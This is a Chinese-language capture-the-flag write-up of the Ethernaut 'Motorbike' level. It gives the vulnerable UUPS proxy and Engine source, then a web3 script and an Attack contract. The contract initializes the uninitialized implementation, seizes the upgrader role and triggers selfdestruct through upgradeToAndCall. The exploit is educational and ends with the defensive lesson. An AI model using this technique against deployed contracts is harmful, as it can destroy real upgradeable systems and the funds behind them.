# Motorbike

> Ethernaut's motorbike has a brand new upgradeable engine design.
>
> Would you be able to `selfdestruct` its engine and make the motorbike unusable ?
>
> Things that might help:
>
> - [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)
> - [UUPS](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) upgradeable pattern
> - [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) contract

## 源码

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

## 攻击思路

`Motorbike`合约使用代理调用`Engine`合约的逻辑，关卡生成的实例地址为`Motorbike`合约地址。我们使用`Engine`合约中的逻辑时，将函数调用发送到`Motorbike`合约中，`Motorbike`合约再代理调用`Engine`合约。关卡目标是销毁`Engine`合约，使`Motorbike`合约失效（无法代理调用）。

`Engine`合约并没有`selfdestruct`方法，无法销毁合约。但是`Motorbike`合约在初始化`Engine`合约时，使用的是代理调用，并没有直接合约间调用。所以实际并没有执行`Engine`合约的`initialize`函数。也就是说，实际的`Engine`合约并没有初始化。我们只要找到实际的`Engine`合约地址，并将它初始化，将`upgrader`变量赋值为我的地址，然后再调用`upgradeToAndCall`函数，让`Engine`合约代理调用`selfdestruct`方法。即可完成目标

## 攻击流程

1. 找到`Engine`合约的地址

   ```js
   var Web3 = require('web3');
   var web3 = new Web3(new Web3.providers.HttpProvider("https://rinkeby.infura.io/v3/4d7440b583e447f7b7d5630b038e0dc7"));
   
   web3.eth.getStorageAt("0xe1e065BfC220B43bC26dDAd015b8E773f71ec599", '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
   .then(console.log);
   ```

   脚本执行完，得到地址：0xFF5C8FA1Cb855b6614B0420f9D816F51D89dE1dA

2. 部署`Attack`合约，执行`attack`方法

   ```solidity
   contract Attack{
   
       Engine target = Engine(0xFF5C8FA1Cb855b6614B0420f9D816F51D89dE1dA);
   
       function attack() public{
           target.initialize();
           target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.selfdestructFun.selector));
       }
   
       function selfdestructFun() public { // 0x1d6c7103
           selfdestruct(address(0));
       }
   }
   ```

   

The advantage of following an UUPS pattern is to have very minimal proxy to be deployed. The proxy acts as storage layer so any state modification in the implementation contract normally doesn't produce side effects to systems using it, since only the logic is used through delegatecalls.

This doesn't mean that you shouldn't watch out for vulnerabilities that can be exploited if we leave an implementation contract uninitialized.

This was a slightly simplified version of what has really been discovered after months of the release of UUPS pattern.

Takeways: never leaves implementation contracts uninitialized ;)

If you're interested in what happened, read more [here](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680).